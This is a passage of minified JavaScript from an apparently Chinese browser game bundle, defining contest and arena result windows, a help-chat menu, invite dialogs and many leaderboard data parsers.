},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];this.itemRole.visible=this.imgItem.visible=!1,this.eList.dataProvider=new eui.ArrayCollection,Timer.start(1e3,this.closeTime,this.updateTimer,this),this.eBg.source=this.bgImgList[i]||"";var n="";n=1==i?gettext("恭喜你{0}胜利",o.ContestCT.getStageName(o.ContestCT.ins().stageType)+(o.ContestCT.ins().stageType>2?gettext("守擂"):"")):2==i?gettext("很遗憾，{0}失败",o.ContestCT.getStageName(o.ContestCT.ins().stageType)+(o.ContestCT.ins().stageType>2?"守擂":"")):gettext("{0}平局",o.ContestCT.getStageName(o.ContestCT.ins().stageType)+(o.ContestCT.ins().stageType>2?gettext("守擂"):"")),n+="\n"+gettext("用时：{0}",s.DateUtils.getFormatBySecond(t[1]||0,s.DateUtils.TIME_FORMAT_5)),this.eLab.text=n},e.prototype.updateTimer=function(){this.closeTime--,this.closeTime<=0&&win.close(this),this.eSureBtn.label=gettext("{0}({1}秒)",this.eSureBtn.name,this.closeTime)},e.prototype.onClick=function(t){switch(t.target){case this.eSureBtn:send(Ts.exitFB),win.close(this)}},e.prototype.removeDisplay=function(){o.ContestCT.ins().contestMateArr=[]},e}(n.BaseView);e.ContestResultWin=r,window.ContestResultWin=r,__reflect(r.prototype,"ContestResultWin",[]),window.ContestResultWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestVSWin=void 0;var n=i(1),o=i(647),s=i(13),a=i(4),r=i(74),l=i(7),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.overTime=0,e._sn_="ContestVSSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=o.ContestVSItemRender},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.overTime=t[0]||0;var i=t[1]||null;this.eList.dataProvider=new eui.ArrayCollection(i),Timer.start(1e3,0,this.updateTime,this);var n=s.SubRoles.ins().getSubRoleByIndex(0),o={name:a.ActorCC.myName,level:a.ActorCC.level,job:n.job,outward:n.outward,power:a.ActorCC.power};this.itemRole.data=o;var l=r.ContestCT.ins().buffIdxArr[0];if(l){var h=r.ContestCT.ins().getBuffIdByIdx(l.idx);this.imgItem.source=r.ContestCT.ins().getBuffMonIcon(h)}else this.imgItem.source=""},e.prototype.updateTime=function(){var t=Math.floor((this.overTime-l.GameServerCC.serverTime)/1e3);this.eTime.text=gettext("{0}秒后进入",t>0?t:0)},e}(n.BaseView);e.ContestVSWin=h,window.ContestVSWin=h,__reflect(h.prototype,"ContestVSWin",[]),window.ContestVSWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ContestVSItemRender=void 0;var n=i(5),o=i(3),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="ContestVSItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged()},e.prototype.dataChanged=function(){if(this.skin&&this.data){var t=this.data;this.txtName.text="s"+t.serverName+"."+t.name,this.txtLevel.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("等级：{0}","|C:0x87ff7b&T:"+t.level)),this.txtPower.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("战力：{0}","|C:0xEC0202&T:"+t.power))}},e}(o.BaseItemRender);e.ContestVSItemRender=s,window.ContestVSItemRender=s,__reflect(s.prototype,"ContestVSItemRender",[]),window.ContestVSItemRender=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LeftTimeWin=void 0;var n=i(1),o=i(7),s=i(8),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="LeftTimeSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.overTime=t[0]||0,Timer.start(1e3,0,this.updateTime,this),this.updateTime()},e.prototype.updateTime=function(){var t=(this.overTime-o.GameServerCC.serverTime)/1e3;0>t&&(t=0,win.close(this)),this.eLeftTime.text=s.DateUtils.getFormatBySecond(t,s.DateUtils.TIME_FORMAT_3)},e}(n.BaseView);e.LeftTimeWin=a,window.LeftTimeWin=a,__reflect(a.prototype,"LeftTimeWin",[]),window.LeftTimeWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.chatKfType=e.ChatListItemRenderer5Item=e.ChatListItemRenderer5=void 0;var n=i(3),o=i(0),s=i(63),a=i(45),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.count=0,e}return __extends(e,t),e.prototype.dataChanged=function(){if(!(this.count>0)){this.count++;var t=0;if(this.data.type==h.Question){this.firstWord.text=gettext("尊敬的勇士，请问有什么问题？（点击选项即可选择）");var e=o.GlobalConfig.WaiterHelpInfoConfig;if(e)for(var i in e){t++;var n=new l;n.data={type:h.Question,id:e[i].id,idx:t},this.secondG.addChild(n)}}else if(this.data.type==h.Answer){this.firstWord.text=gettext("根据问题，为你解答：");var s=o.GlobalConfig.WaiterHelpInfoConfig[this.data.id];if(s){var a=s.answer;for(var r in a){t++;var n=new l;n.data={type:h.Answer,id:a[r],idx:t},this.secondG.addChild(n)}}}t++;var u=new l;u.data={type:h.Other,id:this.secondG.numElements,idx:t},this.secondG.addChild(u)}},e}(n.BaseItemRender);e.ChatListItemRenderer5=r,window.ChatListItemRenderer5=r,__reflect(r.prototype,"ChatListItemRenderer5",[]),window.ChatListItemRenderer5=r;var l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ChatWaiterItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.openWinByTextId)},e.prototype.openWinByTextId=function(){if(this.data.type==h.Question){var t={type:h.Answer,id:this.data.id};a.ChatCT.ins().postKfChatMsg(t)}else if(this.data.type==h.Answer){var e=o.GlobalConfig.WaiterHelpAnConfig[this.data.id];if(e)if(e.text){var i=o.GlobalConfig.HelpInfoConfig[e.text];win.open("CommonHelpWin",(null===i||void 0===i?void 0:i.text)||""),win.close("ChatWin")}else{var n=e.way;s.WarnCT.ins().handleKeFuWayTouch(n),win.close("ChatWin")}}else if(this.data.type==h.Other){var t={type:h.Question,id:0};a.ChatCT.ins().postKfChatMsg(t)}},e.prototype.dataChanged=function(){if(this.data.type==h.Question){var t=o.GlobalConfig.WaiterHelpInfoConfig[this.data.id];t&&(this.firstWord.text=this.data.idx+"、"+t.question)}else if(this.data.type==h.Answer){var t=o.GlobalConfig.WaiterHelpAnConfig[this.data.id];t&&(this.firstWord.text=this.data.idx+"、"+t.answer)}else this.data.type==h.Other&&(this.firstWord.text=this.data.idx+"、"+gettext("其他"))},e.prototype.clearAll=function(){this.firstWord.text="",this.removeTouchEvent(this,this.openWinByTextId)},e}(n.BaseItemRender);e.ChatListItemRenderer5Item=l,window.ChatListItemRenderer5Item=l,__reflect(l.prototype,"ChatListItemRenderer5Item",[]),window.ChatListItemRenderer5Item=l;var h;!function(t){t[t.Question=0]="Question",t[t.Answer=1]="Answer",t[t.Other=2]="Other"}(h=e.chatKfType||(e.chatKfType={})),window.chatKfType=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.kfArenaMark=e.KfArenaRoleVo=void 0;var n=i(47),o=function(){function t(){this.curMonth=new s,this.history=new s,this.power=0,this.winRate=0}return t.prototype.parse=function(t){this.roleID=t.readInt(),this.serverId=t.readInt(),this.isonline=0!=t.readInt(),this.duanLevel=t.readInt(),this.score=t.readInt(),this.curMonth.parse(t),this.history.parse(t),this.power=t.readInt(),this.winRate=t.readInt()/100>>0,this.roleName=t.readString(),this.job=t.readByte(),this.sex=t.readByte(),this.cloth=t.readInt(),this.weapon=t.readInt(),this.wingLv=t.readInt(),this.wingState=t.readByte(),this.pos1=t.readInt(),this.pos2=t.readInt(),this.pos3=t.readInt(),this.zs=t.readInt(),this.lv=t.readInt()},t.prototype.isLeader=function(){return n.KfArenaSys.ins().leaderID==this.roleID},t}();e.KfArenaRoleVo=o,window.KfArenaRoleVo=o,__reflect(o.prototype,"KfArenaRoleVo",[]),window.KfArenaRoleVo=o;var s=function(){function t(){}return t.prototype.parse=function(t){this.win=t.readInt(),this.ping=t.readInt(),this.fail=t.readInt()},t}();e.kfArenaMark=s,window.kfArenaMark=s,__reflect(s.prototype,"kfArenaMark",[]),window.kfArenaMark=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KfArenaResultDataItem=void 0;var n=i(3),o=i(301),s=i(4),a=i(47),r=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t=this;this.data instanceof o.KfArenaData&&(this.data.actorid==s.ActorCC.actorID?this.currentState="oneself":this.data.campId==a.KfArenaSys.ins().myCampId?this.currentState="own":this.currentState="enemy",egret.callLater(function(){t.data.rank<=3?(t.rankImg.source="paihang_d"+t.data.rank,t.rankImg.visible=!0,t.rankTxt.visible=!1):(t.rankTxt.text=t.data.rank+"",t.rankImg.visible=!1,t.rankTxt.visible=!0),t.nameTxt.text=t.data.playerName+"S"+t.data.servId,t.kaTxt.text=t.data.killNum+"/"+t.data.aidNum,t.collectionTxt.text=t.data.collectNum+"",t.scoreTxt.text=t.data.curScore+"",t.arenaPointTxt.text=t.data.curGetScore+"",0==t.data.arenaScore?1==t.data.winType?t.arenaScoreTxt.text=t.data.totalScore+" "+(a.KfArenaSys.ins().winCamp==t.data.campId||3==a.KfArenaSys.ins().winCamp?"+":"-")+t.data.arenaScore:t.arenaScoreTxt.text=""+t.data.totalScore:1==t.data.winType?t.arenaScoreTxt.text=t.data.totalScore+" "+(t.data.arenaScore>0?"+":"")+t.data.arenaScore:t.arenaScoreTxt.text=""+t.data.totalScore,t.mvp.visible=t.data.isMvp,t.firstBloodImg.visible=t.data.isFirstKiller,t.firstCollectionImg.visible=t.data.isFirstCollect,t.data.isOnWin?(t.tags.visible=!0,t.tags.source="kfarena_straight_win_tag"):t.data.isDeserter?(t.tags.visible=!0,t.tags.source="kfarena_deserter_tag"):t.tags.visible=!1},this))},e}(n.BaseItemRender);e.KfArenaResultDataItem=r,window.KfArenaResultDataItem=r,__reflect(r.prototype,"KfArenaResultDataItem",[]),window.KfArenaResultDataItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.kfReceiveInviteWin=void 0;var n=i(1),o=i(47),s=i(24),a=i(5),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="kfReceiveInviteSkin",e._closeTime=10,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.inviteData=t[0],this.addTouchEvent(this.notBtn,this.onTouch),this.addTouchEvent(this.sureBtn,this.onTouch),this.observe(o.KfArenaSys.ins().postCheckHasOtherInviteInfo,this.checkHasOtherInviteInfo),this.update(),this._closeTime=10,this.txtTips.text=gettext("{0}秒后拒绝",this._closeTime),Timer.has(this.flusTime,this)||Timer.start(1e3,this._closeTime,this.flusTime,this)},e.prototype.flusTime=function(){this._closeTime--,this.txtTips.text=gettext("{0}秒后拒绝",this._closeTime),this._closeTime<=0&&(o.KfArenaSys.ins().sendRespondInvite(this.inviteData.roleId,0),this.deletInviteByRoleId(this.inviteData.roleId),Timer.stop(this.flusTime,this),this.checkHasOtherInviteInfo())},e.prototype.deletInviteByRoleId=function(t){for(var e=0,i=o.KfArenaSys.ins().inviteDataList.length;i>e;e++)if(o.KfArenaSys.ins().inviteDataList[e].roleId==t){o.KfArenaSys.ins().inviteDataList.splice(e,1);break}},e.prototype.checkHasOtherInviteInfo=function(){o.KfArenaSys.ins().inviteDataList.length<=0?win.close(this):this.addDisplay(o.KfArenaSys.ins().inviteDataList[o.KfArenaSys.ins().inviteDataList.length-1])},e.prototype.update=function(){this.nameLabel.text=this.inviteData.name,this.powerLabel.text=gettext("战力：{0}",s.CommonUtils.overLengthNo(this.inviteData.power)),this.scoreLabel.text=gettext("积分：{0}",this.inviteData.score),this.winRateLabel.textFlow=a.TextFlowMaker.generateTextFlow(gettext("胜率：|C:{0}&T:{1}%|",16776960,this.inviteData.winRate))},e.prototype.onTouch=function(t){switch(t.target){case this.notBtn:o.KfArenaSys.ins().sendRespondInvite(this.inviteData.roleId,0),this.deletInviteByRoleId(this.inviteData.roleId),this.checkHasOtherInviteInfo();break;case this.sureBtn:o.KfArenaSys.ins().sendRespondInvite(this.inviteData.roleId,1),this.deletInviteByRoleId(this.inviteData.roleId)}},e}(n.BaseView);e.kfReceiveInviteWin=r,window.kfReceiveInviteWin=r,__reflect(r.prototype,"kfReceiveInviteWin",[]),window.kfReceiveInviteWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataSkirmish=void 0;var n=i(81),o=i(7),s=i(0),a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(e,i){t.prototype.parser.call(this,e,i);var n=o.GameServerCC.serverOpenDay+1;for(var a in s.GlobalConfig.SkirmishRankConfig){var r=s.GlobalConfig.SkirmishRankConfig[a];if(r.minRank<=this.pos&&this.pos<=r.maxRank){var l=1;for(var h in r.rewards)n>=+h&&(l=+h);var u=r.rewards[l];return this.reward=u[0].count,void(this.money=u[1].count)}}this.money=this.reward=0,this.value=this.pos},e}(n.RankDataBase);e.RankDataSkirmish=a,window.RankDataSkirmish=a,__reflect(a.prototype,"RankDataSkirmish",[]),window.RankDataSkirmish=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataZhuZao=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.level=t.readShort(),this.zslevel=t.readShort(),this.viplevel=t.readShort(),this.monthCard=t.readShort(),this.value=t.readInt()},e}(n.RankDataBase);e.RankDataZhuZao=o,window.RankDataZhuZao=o,__reflect(o.prototype,"RankDataZhuZao",[]),window.RankDataZhuZao=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataLongHun=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.level=t.readShort(),this.zslevel=t.readShort(),this.viplevel=t.readShort(),this.monthCard=t.readShort(),this.value=t.readInt()},e}(n.RankDataBase);e.RankDataLongHun=o,window.RankDataLongHun=o,__reflect(o.prototype,"RankDataLongHun",[]),window.RankDataLongHun=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataWing=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.level=t.readShort(),this.zslevel=t.readShort(),this.viplevel=t.readShort(),this.monthCard=t.readShort(),this.value=t.readInt()},e}(n.RankDataBase);e.RankDataWing=o,window.RankDataWing=o,__reflect(o.prototype,"RankDataWing",[]),window.RankDataWing=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataBook=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.level=t.readShort(),this.zslevel=t.readShort(),this.viplevel=t.readShort(),this.monthCard=t.readShort(),this.value=t.readDouble()},e}(n.RankDataBase);e.RankDataBook=o,window.RankDataBook=o,__reflect(o.prototype,"RankDataBook",[]),window.RankDataBook=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataZhuan=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.level=t.readShort(),this.zslevel=t.readShort(),this.viplevel=t.readShort(),this.monthCard=t.readShort(),this.value=t.readInt()},e}(n.RankDataBase);e.RankDataZhuan=o,window.RankDataZhuan=o,__reflect(o.prototype,"RankDataZhuan",[]),window.RankDataZhuan=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataScore=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.level=t.readShort(),this.zslevel=t.readShort(),this.viplevel=t.readShort(),this.monthCard=t.readShort(),this.value=t.readDouble()},e}(n.RankDataBase);e.RankDataScore=o,window.RankDataScore=o,__reflect(o.prototype,"RankDataScore",[]),window.RankDataScore=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataWeiWang=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.level=t.readShort(),this.zslevel=t.readShort(),this.viplevel=t.readShort(),this.monthCard=t.readShort(),this.weiWang=t.readInt()},e}(n.RankDataBase);e.RankDataWeiWang=o,window.RankDataWeiWang=o,__reflect(o.prototype,"RankDataWeiWang",[]),window.RankDataWeiWang=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataLuckyNum=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.name=t.readString(),this.vipLevel=t.readUnsignedShort(),this.score=t.readUnsignedShort()},e}(n.RankDataBase);e.RankDataLuckyNum=o,window.RankDataLuckyNum=o,__reflect(o.prototype,"RankDataLuckyNum",[]),window.RankDataLuckyNum=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataRing=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.player=t.readString(),this.vipLevel=t.readUnsignedShort(),this.monthCard=t.readUnsignedShort(),this.value=t.readInt()},e}(n.RankDataBase);e.RankDataRing=o,window.RankDataRing=o,__reflect(o.prototype,"RankDataRing",[]),window.RankDataRing=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataYuanShen=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.player=t.readString(),this.vipLevel=t.readUnsignedShort(),this.monthCard=t.readUnsignedShort(),this.value=t.readInt()},e}(n.RankDataBase);e.RankDataYuanShen=o,window.RankDataYuanShen=o,__reflect(o.prototype,"RankDataYuanShen",[]),window.RankDataYuanShen=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankData37Boss=void 0;var n=i(81),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.serverId=t.readInt(),this.name=t.readString(),this.vipLevel=t.readUnsignedShort(),this.times=t.readUnsignedShort()},e}(n.RankDataBase);e.RankData37Boss=o,window.RankData37Boss=o,__reflect(o.prototype,"RankData37Boss",[]),window.RankData37Boss=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataDart=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.serverName=t.readInt(),this.name=t.readString(),this.vipLevel=t.readUnsignedShort(),this.score=t.readUnsignedInt(),this.serverId=t.readInt()},t}();e.RankDataDart=n,window.RankDataDart=n,__reflect(n.prototype,"RankDataDart",[]),window.RankDataDart=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataGuildDart=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.guildId=t.readInt(),this.serverId=t.readInt(),this.guildName=t.readString(),this.score=t.readUnsignedInt()},t}();e.RankDataGuildDart=n,window.RankDataGuildDart=n,__reflect(n.prototype,"RankDataGuildDart",[]),window.RankDataGuildDart=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataHeirloom=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.player=t.readString(),this.value=t.readDouble()},t}();e.RankDataHeirloom=n,window.RankDataHeirloom=n,__reflect(n.prototype,"RankDataHeirloom",[]),window.RankDataHeirloom=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataShenShou=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.player=t.readString(),this.value=t.readDouble()},t}();e.RankDataShenShou=n,window.RankDataShenShou=n,__reflect(n.prototype,"RankDataShenShou",[]),window.RankDataShenShou=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataHeartMethod=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.player=t.readString(),this.value=t.readInt()},t}();e.RankDataHeartMethod=n,window.RankDataHeartMethod=n,__reflect(n.prototype,"RankDataHeartMethod",[]),window.RankDataHeartMethod=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataMoShen=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.player=t.readString(),this.value=t.readInt()},t}();e.RankDataMoShen=n,window.RankDataMoShen=n,__reflect(n.prototype,"RankDataMoShen",[]),window.RankDataMoShen=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankModel=void 0;var n=i(672),o=i(71),s=i(213),a=function(){function t(t,e){this.type=t,this._dataClass=e,this._dataList=[],this.praise=new n.PraiseData}return t.prototype.getDataList=function(t){return void 0===t&&(t=-1),-1==t?this._dataList:this._dataList[t]},t.prototype.parser=function(t){var e=o.RankDataType.ITEMS[this.type],i=t.readShort();this._dataList.length=i;for(var n=0;i>n;++n)n in this._dataList||(this._dataList[n]=new this._dataClass),this.type!=o.RankDataType.TYPE_FOREST&&this.type!=o.RankDataType.TYPE_INVADE&&this.type!=o.RankDataType.TYPE_LINGJING&&(this._dataList[n].PFVipInfo=s.PFVipCT.parserPFVipInfo(t)),this._dataList[n].RankType=this.type,this._dataList[n].parser(t,e);this.selfPos=t.readShort()},t}();e.RankModel=a,window.RankModel=a,__reflect(a.prototype,"RankModel",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PraiseData=e.SubRole=void 0;var n=i(0),o=i(306),s=i(48),a=i(222),r=i(40),l=function(){function t(){this.pos1=0,this.pos2=0,this.pos3=0,this.deCirShowID=0,this.soulId=0}return t.prototype.parser=function(t){this.job=t.readByte(),this.sex=t.readByte(),this.clothID=t.readInt(),this.swordID=t.readInt(),this.wingLevel=t.readInt(),0==t.readInt()&&(this.wingLevel=-1),this.pos1=t.readInt(),this.pos2=t.readInt(),this.pos3=t.readInt(),this.deCirShowID=t.readInt(),this.soulId=t.readInt(),this.godWingData=new o.GodWingData,this.godWingData.parser(t)},t.prototype.getZhuangBanNG=function(){for(var t=[this.pos1,this.pos2,this.pos3],e=[0,0,0],i=0;3>i;i++){var o=n.GlobalConfig.ZhuangBanId[t[i]||0];o&&(o.otherId>0&&t.indexOf(o.otherId)>-1?e[i]=o.changeId||0:e[i]=t[i])}return e},t.prototype.hideNeff=function(){var t=!1,e=this.getZhuangBanNG();for(var i in e){var o=n.GlobalConfig.ZhuangBanId[e[i]];if(o&&1==o.hideNeff){t=!0;break}}return t},t.prototype.hideWeapons=function(){var t=!1,e=this.getZhuangBanNG();for(var i in e){var o=n.GlobalConfig.ZhuangBanId[e[i]];if(o&&1==o.hideWeapon){t=!0;break}}return t},t}();e.SubRole=l,window.SubRole=l,__reflect(l.prototype,"SubRole",[]);var h=function(){function t(){this.subRole=[],this.roles=[],this.praiseTime=0}return t.prototype.parser=function(t){if(this.id=t.readInt(),this.id>0){this.name=t.readString(),this.ce=t.readDouble(),this.level=t.readShort(),this.zhuan=t.readShort(),this.vipLevel=t.readShort();for(var e=t.readShort(),i=0;e>i;i++){var n=this.roles[i]=new s.Role,o=this.subRole[i]=new l;this.subRole[i].parser(t),n.index=i,n.job=o.job,n.sex=o.sex;var h=new a.EquipsData;h.item=new r.ItemData,h.item.configID=o.swordID;var u=new a.EquipsData;u.item=new r.ItemData,u.item.configID=o.clothID,n.equipsData=[h,null,u]}}},t}();e.PraiseData=h,window.PraiseData=h,__reflect(h.prototype,"PraiseData",[]),window.PraiseData=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataBase1=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readUnsignedShort(),this.id=t.readInt(),this.player=t.readString(),this.value=t.readInt()},t}();e.RankDataBase1=n,window.RankDataBase1=n,__reflect(n.prototype,"RankDataBase1",[]),window.RankDataBase1=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataTT=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.power=t.readDouble(),this.vip=t.readShort(),this.count=t.readInt(),this.month=t.readShort()},t}();e.RankDataTT=n,window.RankDataTT=n,__reflect(n.prototype,"RankDataTT",[]),window.RankDataTT=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataForest=void 0;var n=function(){function t(){}return t.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.star=t.readShort(),this.serverId=t.readInt()},t}();e.RankDataForest=n,window.RankDataForest=n,__reflect(n.prototype,"RankDataForest",[]),window.RankDataForest=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataInvade=void 0;var n=function(){function t(){this.pos=0,this.id=0,this.player="",this.score=0,this.serverId=0,this.title=0,this.frame=0,this.job=0,this.level=0}return t.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString(),this.score=t.readShort(),this.serverId=t.readInt(),this.title=t.readInt(),this.frame=t.readInt(),this.job=t.readByte(),this.level=t.readUnsignedShort()},t}();e.RankDataInvade=n,window.RankDataInvade=n,__reflect(n.prototype,"RankDataInvade",[]),window.RankDataInvade=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RankDataLingJing=void 0;var n=i(8),o=function(){function t(){this.pos=0,this.id=0,this.player="",this.times=0,this.serverId=0,this.title=0,this.frame=0,this.job=0,this.level=0}return t.prototype.parser=function(t,e){this.pos=t.readShort(),this.id=t.readInt(),this.player=t.readString();var i=n.DateUtils.formatMiniDateTime(t.readUnsignedInt()),o=n.DateUtils.showWeekFirstDay(i,!0);this.times=Math.max(0,(i-o.getTime())/1e3),this.serverId=t.readInt(),this.pos<4&&(this.title=t.readInt(),this.frame=t.readInt(),this.job=t.readByte(),this.level=t.readUnsignedShort())},t}();e.RankDataLingJing=o,window.RankDataLingJing=o,__reflect(o.prototype,"RankDataLingJing",[]),window.RankDataLingJing=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BlackSmithData=void 0;var n=i(22),o=function(){function t(){}return t.prototype.parser=function(t){this.itemId=t.readInt(),this.quality=t.readByte(),this.isBuy=t.readByte(),this.attrs=[],this.attrQuality=[];for(var e=0;4>e;e++){var i=t.readInt(),o=t.readInt();this.attrs[2*e]=new n.AttributeData,this.attrs[2*e].type=i,this.attrs[2*e].value=o;var s=t.readInt();this.attrQuality[2*e]=s}for(var e=0;4>e;e++){var i=t.readInt(),o=t.readInt();this.attrs[2*e+1]=new n.AttributeData,this.attrs[2*e+1].type=i,this.attrs[2*e+1].value=o;var s=t.readInt();this.attrQuality[2*e+1]=s}},t}();e.BlackSmithData=o,window.BlackSmithData=o,__reflect(o.prototype,"BlackSmithData",[]),window.BlackSmithData=o;var s=function(){function t(){}return t.prototype.parser=function(t){this.attrId=t.readInt(),this.value=t.readInt(),this.quality=t.readInt()},t}();window.BlackSmithItemData=s,__reflect(s.prototype,"BlackSmithItemData",[]),window.BlackSmithItemData=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BookBarItem=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.imgIcon.source=this.data.icon,this.lbName.text=this.data.mapname,this.showRed.visible=this.data.showRed},e}(n.BaseItemRender);e.BookBarItem=o,window.BookBarItem=o,__reflect(o.prototype,"BookBarItem",[]),window.BookBarItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BookShowItem=void 0;var n=i(49),o=i(3),s=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.dataChanged=function(){this.imgIcon.source="monhead"+this.data.icon+"_png",this.labName.text=this.data.bookName,0==this.data.lv?(this.ql.source="",this.imgIcon.filters=n.FilterUtil.ARRAY_GRAY_FILTER):(this.ql.source=""+this.data.lv,this.imgIcon.filters=[]),this.showRed.visible=this.data.showRed},e}(o.BaseItemRender);e.BookShowItem=s,window.BookShowItem=s,__reflect(s.prototype,"BookShowItem",[]),window.BookShowItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemNum=void 0;var n=i(3),o=function(t){function e(){return t.call(this)||this}return 